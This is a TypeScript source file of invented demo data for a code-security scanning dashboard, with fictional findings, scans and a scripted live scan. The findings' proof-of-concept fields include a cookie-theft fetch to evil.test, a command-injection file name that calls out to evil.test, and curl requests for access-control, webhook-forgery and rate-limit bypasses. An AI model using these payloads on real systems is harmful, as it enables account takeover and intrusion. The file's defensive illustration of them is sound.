import type { DashboardRepo, FindingListItem, findingForUser, HackerRecord, Overview, scanForUser, ScanListItem, SettingsOrg, OrgBillingRow, OrgTeam } from "@sandchest/db";
import type { FeedEvent } from "@/components/app/scan-live";
import { DEFAULT_HACKER, type HackerProfile } from "./hacker";
import type { Severity } from "./format";
import type { PullRow } from "@/server/pulls";
import { samplePulls, sampleSettings } from "./samples";

/**
 * The demo: a made-up account, `acme`, that anyone can click around at /demo
 * without signing in. Everything here is invented, and nothing is ever saved.
 * One deep scan of acme/api plays on a loop (`LIVE_SCRIPT`), so there is
 * always something running to watch. Functions, not constants, so every time
 * is relative to now.
 */

const ago = (minutes: number) => new Date(Date.now() - minutes * 60_000);
const HOUR = 60;
const DAY = 24 * HOUR;
const none = (): Record<Severity, number> => ({ critical: 0, high: 0, medium: 0, low: 0 });
/** Real UUIDs (the pages check), in their own range so they're never mistaken for the skeletons' samples. */
const id = (n: number) => `00000000-0000-4000-8000-d${String(n).padStart(11, "0")}`;

export const DEMO_ORG_ID = id(1);
export const DEMO_LOGIN = "acme";
export const DEMO_HACKER: HackerProfile = { ...DEFAULT_HACKER, handle: "nightjar" };
/** The deep scan that's always running. */
export const DEMO_LIVE_SCAN_ID = id(500);
/** Where the demo lives. Its pages are the dashboard's, under this path instead of /dashboard. */
export const DEMO_BASE = "/demo";

// Repositories ---------------------------------------------------------------------------------------------------

interface RepoSeed {
  n: number;
  name: string;
  privateRepo: boolean;
  loc: number;
  lastDeep: number | null;
  reviews: number;
}

const REPOS: RepoSeed[] = [
  { n: 100, name: "api", privateRepo: true, loc: 48_200, lastDeep: 3 * DAY, reviews: 24 },
  { n: 101, name: "web", privateRepo: true, loc: 61_500, lastDeep: 9 * DAY, reviews: 18 },
  { n: 102, name: "billing", privateRepo: true, loc: 17_800, lastDeep: 12 * DAY, reviews: 9 },
  { n: 103, name: "worker", privateRepo: true, loc: 9_400, lastDeep: null, reviews: 6 },
  { n: 104, name: "mobile", privateRepo: true, loc: 33_100, lastDeep: null, reviews: 11 },
  { n: 105, name: "docs", privateRepo: false, loc: 4_200, lastDeep: null, reviews: 3 },
];

const repoId = (name: string) => id(REPOS.find((repo) => repo.name === name)!.n);

// Findings -------------------------------------------------------------------------------------------------------

type FindingRow = NonNullable<Awaited<ReturnType<typeof findingForUser>>>;
type Finding = FindingRow["finding"];

interface FindingSeed {
  n: number;
  repo: string;
  severity: Severity;
  title: string;
  category: string;
  cwe: string;
  status: "open" | "fixed" | "dismissed";
  dismissReason?: "false_positive" | "accepted_risk" | "wont_fix";
  /** Minutes ago it was first seen, and by which scan. */
  firstSeen: number;
  scan: number;
  prNumber?: number;
  impact: string;
  mitigations?: string;
  entry: { file: string; line: number; description: string };
  path: Array<{ file: string; line: number; note: string; excerpt: string }>;
  attacker: "unauthenticated" | "any_user" | "insider" | "admin";
  preconditions: string;
  poc: string;
  fix: string;
  guarantees: string[];
  mustNotBreak: string[];
  test: string;
  /** Minutes ago it was fixed or dismissed, and by whom ("a push" when null). */
  resolved?: { at: number; login: string | null };
}

const FINDINGS: FindingSeed[] = [
  {
    n: 200,
    repo: "api",
    severity: "critical",
    title: "Any signed-in user can read another account’s invoices",
    category: "broken_access_control",
    cwe: "CWE-639",
    status: "open",
    firstSeen: 3 * DAY,
    scan: 301,
    impact: "An invoice id from any account returns that account’s invoice, with its line items and billing address, to whoever asks.",
    entry: { file: "src/routes/invoices.ts", line: 41, description: "GET /api/invoices/:id, the id path parameter" },
    path: [
      { file: "src/routes/invoices.ts", line: 42, note: "The id from the URL is passed on without checking who owns it.", excerpt: '41| router.get("/api/invoices/:id", requireSession, async (req, res) => {\n42|   const invoice = await getInvoice(req.params.id);\n43|   res.json(invoice);' },
      { file: "src/services/billing.ts", line: 88, note: "getInvoice looks the invoice up by id alone.", excerpt: "87| export async function getInvoice(id: string) {\n88|   return invoices.findById(id);\n89| }" },
      { file: "src/db/invoices.ts", line: 17, note: "The query returns the row whoever owns it.", excerpt: "16| findById(id: string) {\n17|   return db.select().from(invoices).where(eq(invoices.id, id));\n18| }" },
    ],
    attacker: "any_user",
    preconditions: "A signed-in account. Invoice ids are sequential, so they are easy to guess.",
    poc: "curl -H 'cookie: session=<any account>' https://app.example.com/api/invoices/1042",
    fix: "Scope the lookup to the caller’s organisation: look the invoice up by id and organisation together, and return 404 when nothing matches.",
    guarantees: ["An invoice is only returned to members of the organisation that owns it.", "Everyone else gets a 404, not a 403, so ids can’t be probed."],
    mustNotBreak: ["Invoice downloads for the owning organisation.", "The admin billing export."],
    test: "Sign in as a member of another organisation, request an invoice it doesn’t own and expect a 404.",
  },
  {
    n: 201,
    repo: "api",
    severity: "high",
    title: "Webhook signature is checked after the payload is parsed",
    category: "improper_verification",
    cwe: "CWE-347",
    status: "open",
    firstSeen: 3 * DAY,
    scan: 301,
    impact: "Anyone can post a forged payment event: the handler marks an order paid before it learns the signature was wrong.",
    entry: { file: "src/webhooks/handler.ts", line: 102, description: "POST /webhooks/payments, the request body" },
    path: [
      { file: "src/webhooks/handler.ts", line: 108, note: "The body is parsed and dispatched first.", excerpt: "107|   const event = JSON.parse(req.body);\n108|   await dispatch(event);\n109|   verifySignature(req.headers[\"x-signature\"], req.body);" },
      { file: "src/webhooks/dispatch.ts", line: 31, note: "A payment.succeeded event marks the order paid.", excerpt: "30|   case \"payment.succeeded\":\n31|     await orders.markPaid(event.data.orderId);\n32|     break;" },
      { file: "src/webhooks/handler.ts", line: 118, note: "The signature check throws only after the order changed.", excerpt: "117| function verifySignature(signature: string, body: string) {\n118|   if (!timingSafeEqual(sign(body), signature)) throw new Unauthorized();\n119| }" },
    ],
    attacker: "unauthenticated",
    preconditions: "None. The webhook route is public, as webhooks are.",
    poc: "curl -X POST https://api.example.com/webhooks/payments \\\n  -H 'x-signature: nope' \\\n  -d '{\"type\":\"payment.succeeded\",\"data\":{\"orderId\":\"ord_123\"}}'",
    fix: "Verify the signature against the raw body before parsing or acting on it, and reject the request outright when it doesn’t match.",
    guarantees: ["No event is parsed or dispatched until its signature has been verified.", "A request with a bad or missing signature changes nothing and gets a 401."],
    mustNotBreak: ["Genuine payment events from the provider.", "Retries of the same event, which must stay idempotent."],
    test: "Post a payment.succeeded event with a wrong signature and expect a 401 and the order still unpaid.",
  },
  {
    n: 202,
    repo: "api",
    severity: "high",
    title: "Admin export accepts any organisation id",
    category: "privilege_escalation",
    cwe: "CWE-285",
    status: "open",
    firstSeen: 3 * DAY,
    scan: 301,
    impact: "An admin of one organisation can download every member’s email and role from any other organisation.",
    entry: { file: "src/admin/export.ts", line: 70, description: "GET /api/admin/export?org=, the org query parameter" },
    path: [
      { file: "src/admin/export.ts", line: 72, note: "Checks the caller is an admin, but not of which organisation.", excerpt: "71|   if (!req.user.isAdmin) return res.sendStatus(403);\n72|   const orgId = req.query.org as string;" },
      { file: "src/admin/export.ts", line: 77, note: "Exports the members of whichever organisation was asked for.", excerpt: "76|   const members = await memberships.forOrg(orgId);\n77|   res.attachment(\"members.csv\").send(toCsv(members));" },
    ],
    attacker: "admin",
    preconditions: "Admin of any organisation. Anyone can create an organisation and become its admin.",
    poc: "curl -H 'cookie: session=<admin of your own org>' 'https://api.example.com/api/admin/export?org=<another org id>'",
    fix: "Ignore the query parameter, or check it against the caller’s own memberships, and export only an organisation the caller administers.",
    guarantees: ["An export only ever contains an organisation the caller is an admin of."],
    mustNotBreak: ["Admins exporting their own organisation."],
    test: "As the admin of one organisation, ask for another’s export and expect a 404.",
  },
  {
    n: 203,
    repo: "api",
    severity: "medium",
    title: "Profile update lets a member change their own role",
    category: "mass_assignment",
    cwe: "CWE-915",
    status: "open",
    firstSeen: 26 * HOUR,
    scan: 302,
    prNumber: 211,
    impact: "Any member can make themselves an owner of their organisation by adding a role field to a profile update.",
    entry: { file: "src/routes/users.ts", line: 54, description: "PATCH /api/users/me, the JSON body" },
    path: [
      { file: "src/routes/users.ts", line: 56, note: "The whole body is spread into the update.", excerpt: "55|   const changes = { ...req.body, updatedAt: new Date() };\n56|   await users.update(req.user.id, changes);" },
      { file: "src/db/users.ts", line: 40, note: "Every column, role included, is writable.", excerpt: "39| update(id: string, changes: Partial<User>) {\n40|   return db.update(users).set(changes).where(eq(users.id, id));" },
    ],
    attacker: "any_user",
    preconditions: "A signed-in member of any organisation.",
    poc: "curl -X PATCH -H 'cookie: session=<member>' -d '{\"role\":\"owner\"}' https://api.example.com/api/users/me",
    fix: "Pick the fields a person may change (name, avatar, timezone) out of the body instead of spreading it, and validate them.",
    guarantees: ["A profile update can only change name, avatar and timezone."],
    mustNotBreak: ["Editing your own profile in Settings."],
    test: "Send a profile update with role set to owner and expect the role unchanged.",
  },
  {
    n: 204,
    repo: "web",
    severity: "high",
    title: "Password reset tokens never expire",
    category: "weak_authentication",
    cwe: "CWE-640",
    status: "open",
    firstSeen: 9 * DAY,
    scan: 310,
    impact: "A reset link found in an old email, a log or a shared inbox still takes over the account, months later.",
    entry: { file: "app/reset/actions.ts", line: 24, description: "The reset form’s token field" },
    path: [
      { file: "app/reset/actions.ts", line: 31, note: "Looks the token up and accepts it if it exists.", excerpt: "30|   const reset = await resets.find(token);\n31|   if (!reset) return { error: \"Invalid link\" };\n32|   await setPassword(reset.userId, password);" },
      { file: "lib/resets.ts", line: 12, note: "Tokens are stored with no expiry and never deleted after use.", excerpt: "11| export async function create(userId: string) {\n12|   return db.insert(resets).values({ userId, token: randomToken() });" },
    ],
    attacker: "unauthenticated",
    preconditions: "A reset link that was ever sent to the account.",
    poc: "Open a reset link from an email sent weeks ago, choose a new password and sign in with it.",
    fix: "Give each token an expiry (an hour is plenty), delete it once used, and delete the account’s other tokens when the password changes.",
    guarantees: ["A reset token works once, and only within an hour of being issued."],
    mustNotBreak: ["Resetting a password from a fresh link."],
    test: "Use a reset token twice and expect the second attempt to fail; age one past an hour and expect it to fail.",
  },
  {
    n: 205,
    repo: "web",
    severity: "medium",
    title: "Redirect target is taken from the query string",
    category: "open_redirect",
    cwe: "CWE-601",
    status: "open",
    firstSeen: 2 * DAY,
    scan: 303,
    prNumber: 212,
    impact: "A sign-in link on our own domain can send people on to a look-alike site after they sign in, which makes phishing convincing.",
    entry: { file: "app/sign-in/page.tsx", line: 18, description: "/sign-in?next=, the next query parameter" },
    path: [
      { file: "app/sign-in/page.tsx", line: 27, note: "After sign-in, the browser is sent wherever next says.", excerpt: "26|   const next = searchParams.next ?? \"/\";\n27|   redirect(next);" },
    ],
    attacker: "unauthenticated",
    preconditions: "Someone clicks a link that was crafted for them.",
    poc: "https://app.example.com/sign-in?next=https://app-example.com.evil.test/login",
    fix: "Accept only paths on this site: require next to start with a single slash, and fall back to / otherwise.",
    guarantees: ["After sign-in, a person only ever lands on a page of this site."],
    mustNotBreak: ["Returning to the page someone was on before signing in."],
    test: "Sign in with next set to an outside URL and expect to land on /.",
  },
  {
    n: 206,
    repo: "web",
    severity: "medium",
    title: "Session cookie is readable from scripts",
    category: "session_management",
    cwe: "CWE-1004",
    status: "open",
    firstSeen: 9 * DAY,
    scan: 310,
    impact: "Any script injection anywhere on the site becomes a full account takeover, since the script can read the session and send it away.",
    mitigations: "No script injection is known today; this raises the cost of the next one.",
    entry: { file: "lib/session.ts", line: 14, description: "Every signed-in response" },
    path: [{ file: "lib/session.ts", line: 19, note: "The cookie is set without HttpOnly.", excerpt: '18|   cookies().set("session", token, {\n19|     secure: true, sameSite: "lax",\n20|   });' }],
    attacker: "unauthenticated",
    preconditions: "A script injection elsewhere on the site.",
    poc: "fetch('https://evil.test/?c=' + document.cookie)",
    fix: "Set the session cookie with httpOnly: true. Nothing on the client needs to read it.",
    guarantees: ["The session cookie can’t be read by any script."],
    mustNotBreak: ["Signing in and staying signed in."],
    test: "Assert the Set-Cookie header for the session includes HttpOnly.",
  },
  {
    n: 207,
    repo: "billing",
    severity: "medium",
    title: "Uploaded file names reach the shell unescaped",
    category: "command_injection",
    cwe: "CWE-78",
    status: "open",
    firstSeen: 12 * DAY,
    scan: 320,
    impact: "A staff member’s upload with a crafted name runs commands on the billing server.",
    mitigations: "Only staff can upload, so this needs a compromised or malicious staff account.",
    entry: { file: "src/uploads/route.ts", line: 22, description: "POST /uploads, the multipart file name" },
    path: [
      { file: "src/uploads/route.ts", line: 29, note: "The original file name is kept.", excerpt: "28|   const name = file.name;\n29|   await renderPdf(name, await file.arrayBuffer());" },
      { file: "src/pdf/render.ts", line: 64, note: "It goes into a shell command as is.", excerpt: "63| export async function renderPdf(name: string, data: ArrayBuffer) {\n64|   await exec(`wkhtmltopdf /tmp/in.html \"/tmp/${name}.pdf\"`);" },
    ],
    attacker: "insider",
    preconditions: "A staff account that can upload.",
    poc: 'Upload a file named  x"; curl https://evil.test/$(whoami); "',
    fix: "Never pass names to a shell: call the binary with an argument list (execFile), and name the output file with a random id.",
    guarantees: ["No part of an uploaded file’s name reaches a shell or a command line."],
    mustNotBreak: ["Rendering invoices to PDF."],
    test: "Upload a file whose name contains a quote and a $( ) and expect a normal PDF and no command run.",
  },
  {
    n: 208,
    repo: "billing",
    severity: "low",
    title: "A coupon can be redeemed twice by sending two requests at once",
    category: "race_condition",
    cwe: "CWE-362",
    status: "open",
    firstSeen: 12 * DAY,
    scan: 320,
    impact: "A single-use coupon applies twice, so an order gets double the discount.",
    entry: { file: "src/coupons/redeem.ts", line: 10, description: "POST /coupons/redeem, the code" },
    path: [
      { file: "src/coupons/redeem.ts", line: 15, note: "Checks the coupon is unused, then marks it used in a separate query.", excerpt: "14|   if (coupon.usedAt) throw new Error(\"Already used\");\n15|   await applyDiscount(order, coupon);\n16|   await coupons.markUsed(coupon.id);" },
    ],
    attacker: "any_user",
    preconditions: "A valid single-use coupon.",
    poc: "Send the same redeem request twice in parallel; both succeed.",
    fix: "Claim the coupon atomically: UPDATE … SET used_at = now() WHERE id = $1 AND used_at IS NULL, and only apply the discount if a row changed.",
    guarantees: ["A single-use coupon is applied at most once, however many requests arrive together."],
    mustNotBreak: ["Redeeming a coupon once."],
    test: "Redeem one coupon from 10 parallel requests and expect exactly one success.",
  },
  {
    n: 209,
    repo: "worker",
    severity: "low",
    title: "Rate limit keys on a header the client controls",
    category: "rate_limit_bypass",
    cwe: "CWE-290",
    status: "open",
    firstSeen: 5 * DAY,
    scan: 307,
    prNumber: 209,
    impact: "Anyone can send unlimited requests to the job API by changing X-Forwarded-For on each one.",
    entry: { file: "src/limits.ts", line: 8, description: "Every request to the job API" },
    path: [{ file: "src/limits.ts", line: 12, note: "The limiter’s key is the first X-Forwarded-For address, which the client sets.", excerpt: '11|   const key = req.headers["x-forwarded-for"]?.split(",")[0] ?? req.ip;\n12|   return limiter.take(key);' }],
    attacker: "unauthenticated",
    preconditions: "None.",
    poc: "for i in $(seq 1000); do curl -H \"x-forwarded-for: 10.0.$((i/250)).$((i%250))\" https://jobs.example.com/api/jobs; done",
    fix: "Key the limit on the address your load balancer saw (the last trusted hop), not on a header the client writes.",
    guarantees: ["A client can’t pick its own rate-limit key."],
    mustNotBreak: ["Separate limits for separate clients behind the load balancer."],
    test: "Send requests over the limit with a different X-Forwarded-For on each and expect a 429.",
  },
  {
    n: 210,
    repo: "api",
    severity: "high",
    title: "API keys are written to the request log",
    category: "sensitive_data_exposure",
    cwe: "CWE-532",
    status: "fixed",
    firstSeen: 6 * DAY,
    scan: 304,
    prNumber: 205,
    impact: "Anyone who can read the logs can use any customer’s API key.",
    entry: { file: "src/middleware/log.ts", line: 9, description: "Every API request" },
    path: [{ file: "src/middleware/log.ts", line: 11, note: "Headers are logged whole, Authorization included.", excerpt: "10|   logger.info({ path: req.path, headers: req.headers });\n11|   next();" }],
    attacker: "insider",
    preconditions: "Read access to the logs.",
    poc: "Search the logs for 'authorization: Bearer'.",
    fix: "Log an allow-list of headers, never Authorization or cookies.",
    guarantees: ["No credential is ever written to a log."],
    mustNotBreak: ["Request logging for debugging."],
    test: "Make a request with an API key and assert the key appears nowhere in the log output.",
    resolved: { at: 4 * DAY, login: null },
  },
  {
    n: 211,
    repo: "web",
    severity: "medium",
    title: "Debug page is reachable in production",
    category: "information_disclosure",
    cwe: "CWE-489",
    status: "dismissed",
    dismissReason: "false_positive",
    firstSeen: 9 * DAY,
    scan: 310,
    impact: "The debug page lists environment variable names and build details.",
    entry: { file: "app/debug/page.tsx", line: 5, description: "GET /debug" },
    path: [{ file: "app/debug/page.tsx", line: 8, note: "Renders the environment’s keys.", excerpt: "7| export default function Debug() {\n8|   return <pre>{Object.keys(process.env).join(\"\\n\")}</pre>;" }],
    attacker: "unauthenticated",
    preconditions: "None.",
    poc: "curl https://app.example.com/debug",
    fix: "Remove the page from production builds.",
    guarantees: ["/debug returns 404 in production."],
    mustNotBreak: [],
    test: "Request /debug from a production build and expect a 404.",
    resolved: { at: 8 * DAY, login: "you" },
  },
];

function findingRow(seed: FindingSeed): FindingRow {
  const repo = REPOS.find((r) => r.name === seed.repo)!;
  const finding: Finding = {
    id: id(seed.n),
    repoId: id(repo.n),
    fingerprint: `demo-${seed.n}`,
    status: seed.status,
    dismissReason: seed.dismissReason ?? null,
    severity: seed.severity,
    confidence: "high",
    category: seed.category,
    cwe: seed.cwe,
    title: seed.title,
    impact: seed.impact,
    mitigations: seed.mitigations ?? "",
    entryPoint: seed.entry,
    attackPath: seed.status === "open" ? seed.path : seed.path.map(({ excerpt: _, ...step }) => step),
    attacker: seed.attacker,
    preconditions: seed.preconditions,
    proofOfConcept: seed.poc,
    fixGuidance: seed.fix,
    guarantees: seed.guarantees,
    mustNotBreak: seed.mustNotBreak,
    regressionTest: seed.test,
    fixPrompt: "",
    trust: "confirmed",
    sources: [],
    validation: null,
    sourceScanId: id(seed.scan),
    sourceKind: seed.prNumber !== undefined ? "pr_review" : "deep",
    prNumber: seed.prNumber ?? null,
    staleAt: null,
    firstSeenAt: ago(seed.firstSeen),
    lastSeenAt: ago(Math.min(seed.firstSeen, 2 * HOUR)),
    fixedAt: seed.status === "fixed" && seed.resolved ? ago(seed.resolved.at) : null,
  };
  const history: FindingRow["history"] = [{ type: "seen", at: ago(seed.firstSeen), login: null, scanId: id(seed.scan) }];
  if (seed.resolved) history.push({ type: seed.status === "fixed" ? "fixed" : "dismissed", at: ago(seed.resolved.at), login: seed.resolved.login, scanId: null } as FindingRow["history"][number]);
  return { finding, repo: { id: id(repo.n), fullName: `${DEMO_LOGIN}/${repo.name}`, private: repo.privateRepo, defaultBranch: "main" }, history };
}

export function demoFinding(findingId: string): FindingRow | undefined {
  const seed = FINDINGS.find((f) => id(f.n) === findingId);
  return seed && findingRow(seed);
}

function listItem(seed: FindingSeed): FindingListItem {
  const sink = seed.path.at(-1)!;
  return {
    id: id(seed.n),
    title: seed.title,
    severity: seed.severity,
    confidence: "high",
    status: seed.status,
    category: seed.category,
    repoId: repoId(seed.repo),
    repoFullName: `${DEMO_LOGIN}/${seed.repo}`,
    sink: { file: sink.file, line: sink.line },
    sourceKind: seed.prNumber !== undefined ? "pr_review" : "deep",
    prNumber: seed.prNumber ?? null,
    lastSeenAt: ago(Math.min(seed.firstSeen, 2 * HOUR)),
    stale: false,
  };
}

const RANK: Record<Severity, number> = { critical: 0, high: 1, medium: 2, low: 3 };

/** Findings as the list reads them: by status, severities and repository; worst first. */
export function demoFindings(filters: { status?: "open" | "fixed" | "dismissed"; severities?: Severity[]; repoId?: string } = {}, limit?: number): FindingListItem[] {
  const list = FINDINGS.map(listItem)
    .filter((f) => f.status === (filters.status ?? "open"))
    .filter((f) => !filters.severities?.length || filters.severities.includes(f.severity as Severity))
    .filter((f) => !filters.repoId || f.repoId === filters.repoId)
    .sort((a, b) => RANK[a.severity as Severity] - RANK[b.severity as Severity]);
  return limit ? list.slice(0, limit) : list;
}

export function demoFindingCounts(filters: { severities?: Severity[]; repoId?: string }): Record<"open" | "fixed" | "dismissed", number> {
  return {
    open: demoFindings({ ...filters, status: "open" }).length,
    fixed: demoFindings({ ...filters, status: "fixed" }).length,
    dismissed: demoFindings({ ...filters, status: "dismissed" }).length,
  };
}

function openBySeverity(repo: string): Record<Severity, number> {
  const counts = none();
  for (const f of FINDINGS) if (f.repo === repo && f.status === "open") counts[f.severity]++;
  return counts;
}

// Scans ----------------------------------------------------------------------------------------------------------

type ScanRow = NonNullable<Awaited<ReturnType<typeof scanForUser>>>;

interface ScanSeed {
  n: number;
  kind: "deep" | "pr_review" | "recon" | "fix_check";
  repo: string;
  pr?: number;
  /** Minutes ago it started, and how long it ran. */
  at: number;
  minutes: number;
  credits: number;
  stats?: { checked?: number; fixed?: number };
}

const SCANS: ScanSeed[] = [
  { n: 303, kind: "pr_review", repo: "web", pr: 212, at: 2 * DAY, minutes: 2, credits: 1 },
  { n: 302, kind: "pr_review", repo: "api", pr: 211, at: 26 * HOUR, minutes: 2, credits: 1 },
  { n: 301, kind: "deep", repo: "api", at: 3 * DAY, minutes: 21, credits: 15 },
  { n: 305, kind: "pr_review", repo: "billing", pr: 88, at: 3 * DAY + 4 * HOUR, minutes: 1, credits: 1 },
  { n: 306, kind: "fix_check", repo: "api", at: 4 * DAY, minutes: 1, credits: 0, stats: { checked: 1, fixed: 1 } },
  { n: 307, kind: "pr_review", repo: "worker", pr: 209, at: 5 * DAY, minutes: 1, credits: 1 },
  { n: 304, kind: "pr_review", repo: "api", pr: 205, at: 6 * DAY, minutes: 2, credits: 1 },
  { n: 308, kind: "recon", repo: "mobile", at: 7 * DAY, minutes: 1, credits: 0 },
  { n: 309, kind: "pr_review", repo: "mobile", pr: 41, at: 7 * DAY + 3 * HOUR, minutes: 1, credits: 1 },
  { n: 310, kind: "deep", repo: "web", at: 9 * DAY, minutes: 26, credits: 30 },
  { n: 311, kind: "pr_review", repo: "docs", pr: 17, at: 10 * DAY, minutes: 1, credits: 1 },
  { n: 320, kind: "deep", repo: "billing", at: 12 * DAY, minutes: 14, credits: 15 },
];

/** Findings a scan reported. */
const foundBy = (scan: number) => FINDINGS.filter((f) => f.scan === scan);

function scanListItem(seed: ScanSeed): ScanListItem {
  const found = none();
  for (const f of foundBy(seed.n)) found[f.severity]++;
  return {
    id: id(seed.n),
    kind: seed.kind,
    status: "completed",
    prNumber: seed.pr ?? null,
    repoId: repoId(seed.repo),
    repoFullName: `${DEMO_LOGIN}/${seed.repo}`,
    createdAt: ago(seed.at),
    finishedAt: ago(seed.at - seed.minutes),
    durationMs: seed.minutes * 60_000,
    credits: seed.credits,
    found,
  };
}

/** The live scan as the lists show it: running, started a minute ago. */
function liveListItem(): ScanListItem {
  return { id: DEMO_LIVE_SCAN_ID, kind: "deep", status: "running", prNumber: null, repoId: repoId("api"), repoFullName: `${DEMO_LOGIN}/api`, createdAt: ago(1), finishedAt: null, durationMs: null, credits: 0, found: none() };
}

/** Scans newest first, by kind and repository. */
export function demoScans(filters: { kind?: string; repoId?: string; orgId?: string } = {}, limit?: number): ScanListItem[] {
  const list = [liveListItem(), ...SCANS.map(scanListItem)]
    .filter((s) => !filters.kind || s.kind === filters.kind)
    .filter((s) => !filters.repoId || s.repoId === filters.repoId)
    .sort((a, b) => b.createdAt.getTime() - a.createdAt.getTime());
  return limit ? list.slice(0, limit) : list;
}

/**
 * The live deep scan's feed: seconds into the run, the line's type and what it says. The types are the engine's,
 * so the step track and the hacker's screen follow it as they follow a real scan. Each finding is one of acme/api's.
 */
export const LIVE_SCRIPT: Array<[at: number, type: string, message: string]> = [
  [0, "stage:setup", "Cloning acme/api at the default branch…"],
  [1.6, "stage:index", "Indexing the code…"],
  [3.4, "progress", "Indexed 412 files, 48k lines."],
  [4.6, "stage:sweep", "Sweeping for secrets, vulnerable dependencies and dangerous sinks…"],
  [6.4, "progress", "3 leads: 1 reachable dependency advisory, 2 raw SQL sinks."],
  [7.8, "stage:recon", "Mapping the attack surface…"],
  [9.6, "progress", "Mapped 38 entry points and 6 areas to scan."],
  [11, "stage:hunt", "Hunting across 6 areas: auth, invoices, webhooks, admin, users, abuse."],
  [13, "progress", "auth: following the session cookie through middleware."],
  [15, "progress", "invoices: checking who can reach GET /api/invoices/:id."],
  [17.5, "progress", "invoices: getInvoice looks the row up by id alone."],
  [19, "finding", "Any signed-in user can read another account’s invoices"],
  [22, "progress", "webhooks: the body is parsed before the signature is checked."],
  [24, "finding", "Webhook signature is checked after the payload is parsed"],
  [26.5, "progress", "admin: export checks for an admin, but not of which organisation."],
  [28.5, "finding", "Admin export accepts any organisation id"],
  [30.5, "progress", "users: PATCH /api/users/me spreads the body into the update."],
  [32.5, "stage:coverage", "Checking code the first pass never opened with 2 more hunters…"],
  [35, "progress", "abuse: login attempts are rate limited per account and per address."],
  [37, "stage:verify", "Proving the code path of what we found…"],
  [39.5, "progress", "Skeptic: 3 confirmed, 1 disproved (the raw SQL is parameterised)."],
  [42, "stage:done", "3 findings: 1 critical, 2 high."],
];
/** When the live scan ends, and how long it rests, done, before it starts again. */
export const LIVE_ENDS_AT = 43;
export const LIVE_REST = 12;
/** The findings the live scan reports, in the order its feed names them. */
const LIVE_FINDINGS = [200, 201, 202];

const FEEDS: Record<ScanSeed["kind"], (seed: ScanSeed) => Array<[string, string]>> = {
  deep: (seed) => [
    ["stage:setup", `Cloning acme/${seed.repo} at the default branch…`],
    ["stage:index", "Indexing the code…"],
    ["stage:sweep", "Sweeping for secrets, vulnerable dependencies and dangerous sinks…"],
    ["stage:recon", "Mapping the attack surface…"],
    ["stage:hunt", "Hunting across every area of the map…"],
    ...foundBy(seed.n).map((f): [string, string] => ["finding", f.title]),
    ["stage:coverage", "Checking code the first pass never opened…"],
    ["stage:verify", "Proving the code path of what we found…"],
    ["stage:done", `${foundBy(seed.n).length} findings.`],
  ],
  pr_review: (seed) => [
    ["stage:setup", `Checking out PR #${seed.pr}…`],
    ["stage:index", "Indexing the changed files and what calls them…"],
    ["stage:sweep", "Sweeping the diff for secrets and dangerous sinks…"],
    ["stage:hunt", "Reviewing the change against the threat model…"],
    ...foundBy(seed.n).map((f): [string, string] => ["finding", f.title]),
    ["stage:verify", "Proving the code path of what we found…"],
    ["stage:done", foundBy(seed.n).length ? `${foundBy(seed.n).length} finding.` : "Nothing found. The check passed."],
  ],
  recon: (seed) => [
    ["stage:setup", `Cloning acme/${seed.repo} at the default branch…`],
    ["stage:index", "Indexing the code…"],
    ["stage:recon", "Mapping entry points, trust boundaries and dangerous sinks…"],
    ["progress", "Mapped 22 entry points and 4 areas to scan."],
    ["stage:done", "Threat model saved."],
  ],
  fix_check: () => [
    ["stage:setup", "A push touched code an open finding cites. Checking it again…"],
    ["progress", "API keys are written to the request log: the attack path is gone."],
    ["stage:done", "1 of 1 fixed."],
  ],
};

export function demoScan(scanId: string): ScanRow | undefined {
  if (scanId === DEMO_LIVE_SCAN_ID) return liveScan();
  const seed = SCANS.find((s) => id(s.n) === scanId);
  if (!seed) return undefined;
  const started = ago(seed.at);
  const feed = FEEDS[seed.kind](seed);
  const step = (seed.minutes * 60_000) / feed.length;
  const repo = REPOS.find((r) => r.name === seed.repo)!;
  return {
    ...scanBase(seed.n, seed.repo, seed.kind, "completed", started, ago(seed.at - seed.minutes)),
    scan: {
      ...scanBase(seed.n, seed.repo, seed.kind, "completed", started, ago(seed.at - seed.minutes)).scan,
      prNumber: seed.pr ?? null,
      headSha: seed.pr ? "9c41e0a2b7d3f6e18a5c0b4d2e7f9a1c3b5d7e9f" : "HEAD",
      credits: seed.credits,
      billing: seed.credits ? "charged" : "free",
      stats: seed.kind === "fix_check" ? seed.stats : { loc: seed.kind === "pr_review" ? 1_400 : repo.loc },
    },
    findings: foundBy(seed.n).map(({ n, title, severity, status, path }) => ({ id: id(n), title, severity, confidence: "high", status, sink: { file: path.at(-1)!.file, line: path.at(-1)!.line } })),
    events: feed.map(([type, message], i) => ({ seq: i + 1, type, message, createdAt: new Date(started.getTime() + i * step) })),
  } as ScanRow;
}

function scanBase(n: number, repo: string, kind: string, status: string, started: Date, finished: Date | null) {
  const r = REPOS.find((x) => x.name === repo)!;
  return {
    scan: {
      id: id(n),
      repoId: id(r.n),
      orgId: DEMO_ORG_ID,
      kind,
      status,
      trigger: kind === "deep" ? "manual" : "webhook",
      prNumber: null,
      headSha: "HEAD",
      baseSha: null,
      checkRunId: null,
      workflowRunId: null,
      credits: 0,
      leads: null,
      stats: { loc: r.loc },
      error: null,
      notifiedAt: null,
      creditsReserved: 0,
      billing: "free",
      createdAt: started,
      startedAt: started,
      finishedAt: finished,
    },
    repo: { id: id(r.n), fullName: `${DEMO_LOGIN}/${repo}`, private: r.privateRepo },
    org: { login: DEMO_LOGIN, hacker: DEMO_HACKER },
    metrics: null,
    findings: [],
    events: [],
  };
}

/** The live deep scan, as the page first draws it: running, its findings ready to show as the feed names them. */
function liveScan(): ScanRow {
  const row = scanBase(500, "api", "deep", "running", new Date(), null);
  return {
    ...row,
    findings: LIVE_FINDINGS.map((n) => FINDINGS.find((f) => f.n === n)!).map(({ n, title, severity, status, path }) => ({ id: id(n), title, severity, confidence: "high", status, sink: { file: path.at(-1)!.file, line: path.at(-1)!.line } })),
  } as ScanRow;
}

/** The live scan's feed `seconds` into a run, sequence numbers starting after `seq`. */
export function liveEvents(seconds: number, origin: number, seq = 0): FeedEvent[] {
  return LIVE_SCRIPT.filter(([at]) => at <= seconds).map(([at, type, message], i) => ({ seq: seq + i + 1, type, message, at: origin + at * 1000 }));
}

// Repositories, overview, hacker, settings ---------------------------------------------------------------------

export function demoRepos(): DashboardRepo[] {
  return REPOS.map((repo) => {
    const last = demoScans({ repoId: id(repo.n) }).find((scan) => scan.id !== DEMO_LIVE_SCAN_ID);
    const live = repo.name === "api";
    return {
      id: id(repo.n),
      fullName: `${DEMO_LOGIN}/${repo.name}`,
      private: repo.privateRepo,
      orgId: DEMO_ORG_ID,
